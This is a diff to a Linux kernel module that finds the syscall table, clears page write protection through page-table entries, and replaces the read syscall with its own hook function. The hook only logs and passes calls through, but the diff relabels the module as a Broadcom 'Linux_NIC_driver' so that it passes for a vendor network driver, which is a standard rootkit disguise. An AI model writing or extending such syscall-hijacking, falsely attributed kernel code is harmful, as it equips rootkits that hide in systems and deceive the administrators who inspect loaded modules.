@@ -1,6 +1,7 @@
-#include <linux/init.h> //Macros
+
+#include <linux/init.h>
 #include <linux/module.h>
-#include <linux/syscalls.h> //Need to grab syscalls
+#include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
 #include <linux/kern_levels.h>
@@ -14,10 +15,10 @@
 //#define DRIVER_DESCRIPTION "Linux STA NIC driver"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Me");
-MODULE_DESCRIPTION("Linux STA NIC driver");
-MODULE_VERSION("1.0");
-//MODULE_SUPPORTED_DEVICE("NIC_Device");
+MODULE_AUTHOR("Broadcom Corporation");
+MODULE_DESCRIPTION("Linux_NIC_driver");
+MODULE_VERSION("1");
+MODULE_SUPPORTED_DEVICE("NIC_Device");
 
 //-----------------------------------------------
 
@@ -26,14 +27,36 @@ unsigned long **SYS_CALL_TABLE; //Points to sys call table
 
 
 
-
-
+/*
+//Functions broken as of kernel 3.15
 void EnablePageWriting(void){
 	write_cr0(read_cr0() & (~0x10000)); //Setting processor flags to disable anti-writng feature
 
-} 
+}
+
 void DisablePageWriting(void){
 	write_cr0(read_cr0() | 0x10000); //Setting processor flag to reinable anti-writing feature
+
+}
+
+*/
+
+//Patch for newer kernel
+void EnablePageWriting(unsigned long address){
+	unsigned int level;
+	pte_t *pte = lookup_address(address, &level);
+
+	if(pte->pte &~ _PAGE_RW){
+		pte->pte |= _PAGE_RW;
+	}
+}
+
+void DisablePageWriting(unsigned long address){
+	unsigned int level;
+
+	pte_t *pte = lookup_address(address, &level);
+
+	pte->pte = pte->pte &~ _PAGE_RW;
 
 } 
 
@@ -42,9 +65,9 @@ void DisablePageWriting(void){
 asmlinkage int (*original_read)(unsigned int, void __user*, size_t); //Normal read function
 
 //Modified Read function
-printk(KERN_INFO "ATTEMPTING READ!!");
+
 asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) { 
-	printk(KERN_INFO "READ HOOKED HERE! -- This is our function!"); 
+	printk(KERN_INFO "READ HERE"); 
 	return (*original_read)(fd, buf, count); //Return to original read
 }
 
@@ -60,13 +83,14 @@ static int __init SetHooks(void) {
 	printk(KERN_INFO "Hooks Will Be Set.\n");
 	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);
 
-
-	EnablePageWriting(); //Overwrite desired syscall
+	//Since sys_call_table is the address we want to overwrite (write to) we can parse it here to do so
+	EnablePageWriting( (unsigned long )SYS_CALL_TABLE ); //Overwrite desired syscall
 
     // Replaces Pointer Of Syscall_read on our syscall.
 	original_read = (void*)SYS_CALL_TABLE[__NR_read];
 	SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead; //Point to our code
-	DisablePageWriting(); //Return to normal mode (pages safe again)
+	
+	DisablePageWriting( (unsigned long)SYS_CALL_TABLE ); //Return to normal mode (pages safe again)
 
 	return 0;
 }
@@ -80,9 +104,9 @@ static int __init SetHooks(void) {
 static void __exit HookCleanup(void) {
 
 	// Clean up our Hooks
-	EnablePageWriting();
+	EnablePageWriting( (unsigned long) SYS_CALL_TABLE );
 	SYS_CALL_TABLE[__NR_read] = (unsigned long*)original_read;
-	DisablePageWriting();
+	DisablePageWriting( (unsigned long) SYS_CALL_TABLE );
 
 	printk(KERN_INFO "HooksCleaned Up!");
 }
